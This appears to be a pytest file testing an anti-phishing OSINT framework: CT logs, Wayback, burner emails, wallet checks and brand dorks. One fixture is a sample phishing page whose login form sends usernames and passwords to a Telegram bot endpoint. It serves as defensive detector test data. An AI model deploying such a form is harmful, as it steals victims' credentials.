"""
AegisOSINT - OSINT Framework Recon Unit & Integration Tests
Validates Certificate Transparency logs, Wayback Machine forensics,
Username footprinting, email analysis, anti-cloaking/C2 detection, and XAI attribution.
"""

import pytest
from starlette.testclient import TestClient
from backend.modules.osint_framework_recon import OSINTFrameworkRecon
from backend.app import app


@pytest.fixture
def recon():
    return OSINTFrameworkRecon()


@pytest.fixture
def client():
    return TestClient(app)


def test_certificate_transparency_recon(recon):
    res = recon.query_certificate_transparency("paypal", limit=5)
    assert res["total_certificates_found"] > 0
    assert "certificates" in res
    assert "Certificate Transparency" in res["source"] or "crt.sh" in res["source"] or "Certspotter" in res["source"]


def test_wayback_machine_recon(recon):
    res = recon.query_wayback_machine("paypal-security-login.top", limit=5)
    assert "source" in res
    assert "forensic_verdict" in res
    assert "is_freshly_staged_zero_history" in res


def test_username_footprint_probe(recon):
    res = recon.probe_username_footprint("@PayPal_SupportDesk")
    assert res["platforms_scanned"] >= 5
    assert len(res["footprint"]) >= 5
    assert any(p["platform"] == "Twitter/X" for p in res["footprint"])


def test_scammer_email_analysis(recon):
    # Test disposable burner email
    burner_res = recon.analyze_scammer_email("scammer123@mailinator.com")
    assert burner_res["is_disposable_burner"] is True
    assert burner_res["risk_score"] >= 65

    # Test deceptive local-part
    spoofed_res = recon.analyze_scammer_email("security-support-billing8492@gmail.com")
    assert spoofed_res["is_free_webmail"] is True
    assert spoofed_res["risk_score"] >= 50
    assert len(spoofed_res["indicators"]) >= 2


def test_cloaking_and_c2_detection(recon):
    phishing_html = """
    <html>
      <head>
        <script>document.addEventListener('contextmenu', event => event.preventDefault());</script>
      </head>
      <body>
        <form action="https://api.telegram.org/bot123456:ABC-DEF/sendMessage" method="POST">
          <input type="text" name="username">
          <input type="password" name="password">
          <button type="submit">Verify</button>
        </form>
      </body>
    </html>
    """
    res = recon.detect_cloaking_and_form_c2(phishing_html, "secure-login.top")
    assert res["is_stealth_phishing_kit"] is True
    assert len(res["c2_exfiltration_threats"]) >= 1
    assert res["c2_exfiltration_threats"][0]["exfiltration_type"] == "TELEGRAM_BOT_C2"
    assert len(res["cloaking_evasion_tactics"]) >= 1


def test_xai_attribution_engine(recon):
    features = {
        "Domain Lexical / Combosquat": 25.0,
        "Zero-History Ephemeral CT Cert": 20.0,
        "Cloned Perceptual Logo": 24.5,
        "Psychological Urgency Coercion": 15.0,
        "Co-located Bulletproof ASN Hub": 10.0
    }
    attributions = recon.explain_threat_attribution(features)
    assert len(attributions) == 5
    assert attributions[0]["weight_contribution"] == 25.0
    assert attributions[0]["impact_tier"] == "STRONG_MALICIOUS"


def test_recon_api_endpoints(client):
    # CT logs endpoint
    res_ct = client.post("/api/recon/ct-logs", json={"query": "binance", "limit": 5})
    assert res_ct.status_code == 200
    assert res_ct.json()["total_certificates_found"] > 0

    # Wayback endpoint
    res_wb = client.post("/api/recon/wayback", json={"domain": "example.com", "limit": 5})
    assert res_wb.status_code == 200

    # Username footprint endpoint
    res_user = client.post("/api/recon/username-footprint", json={"handle": "@binance_help"})
    assert res_user.status_code == 200

    # Scammer email endpoint
    res_email = client.post("/api/recon/scammer-email", json={"email": "alert@guerrillamail.com"})
    assert res_email.status_code == 200
    assert res_email.json()["is_disposable_burner"] is True

    # XAI attribution endpoint
    res_xai = client.post("/api/recon/explain-xai", json={"features": {"Domain": 20.0, "Visual": 15.0}})
    assert res_xai.status_code == 200
    assert len(res_xai.json()["attributions"]) == 2


def test_osint_framework_taxonomy_and_search(recon, client):
    # Test taxonomy loading
    cats = recon.get_framework_categories()
    assert len(cats) >= 30
    assert any(c["category"] == "Domain Name" for c in cats)
    assert any(c["category"] == "IP & MAC Address" for c in cats)

    # Test search
    res = recon.search_framework(query="shodan", limit=10)
    assert res["total_matches"] >= 1
    assert any("shodan" in t["url"].lower() or "shodan" in t["name"].lower() for t in res["tools"])

    # Test API endpoints
    r_cat = client.get("/api/recon/osint-framework/categories")
    assert r_cat.status_code == 200
    assert len(r_cat.json()["categories"]) >= 30

    r_search = client.get("/api/recon/osint-framework/search?q=whois&limit=5")
    assert r_search.status_code == 200
    assert r_search.json()["total_matches"] > 0


def test_ip_infrastructure_and_shodan_recon(recon, client):
    # Direct method test
    res = recon.recon_ip_infrastructure("8.8.8.8")
    assert res["resolved_ip"] == "8.8.8.8"
    assert "geolocation" in res
    assert "shodan_telemetry" in res
    assert res["status"] != "UNRESOLVABLE"

    # API endpoint test
    r_api = client.post("/api/recon/ip-infrastructure", json={"target": "1.1.1.1"})
    assert r_api.status_code == 200
    data = r_api.json()
    assert data["resolved_ip"] == "1.1.1.1"
    assert "severity" in data


def test_threat_intelligence_alienvault(recon, client):
    res = recon.query_threat_intelligence("paypal.com")
    assert res["indicator"] == "paypal.com"
    assert "threat_level" in res
    assert "osint_intel_links" in res
    assert len(res["osint_intel_links"]) >= 4

    r_api = client.post("/api/recon/threat-intel", json={"indicator": "github.com"})
    assert r_api.status_code == 200
    assert "threat_level" in r_api.json()


def test_crypto_wallet_auditor(recon, client):
    # Test BTC wallet
    btc_addr = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
    res_btc = recon.analyze_crypto_wallet(btc_addr)
    assert res_btc["currency"] == "BITCOIN (BTC)"
    assert res_btc["is_valid_syntax"] is True
    assert len(res_btc["osint_forensic_links"]) >= 3

    # Test ETH wallet
    eth_addr = "0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045"
    res_eth = recon.analyze_crypto_wallet(eth_addr)
    assert res_eth["currency"] == "ETHEREUM (ETH / ERC-20)"
    assert res_eth["is_valid_syntax"] is True

    # API endpoint test
    r_api = client.post("/api/recon/crypto-wallet", json={"address": btc_addr})
    assert r_api.status_code == 200
    assert r_api.json()["currency"] == "BITCOIN (BTC)"


def test_brand_dorks_generator(recon, client):
    res = recon.generate_brand_dorks("Microsoft", "microsoft.com")
    assert res["dorks_generated"] >= 6
    assert len(res["dorks"]) >= 6
    for d in res["dorks"]:
        assert "google_url" in d
        assert "duckduckgo_url" in d
        assert "bing_url" in d

    # API endpoint test
    r_api = client.post("/api/recon/brand-dorks", json={"brand_name": "Apple", "legitimate_domain": "apple.com"})
    assert r_api.status_code == 200
    assert r_api.json()["dorks_generated"] >= 6

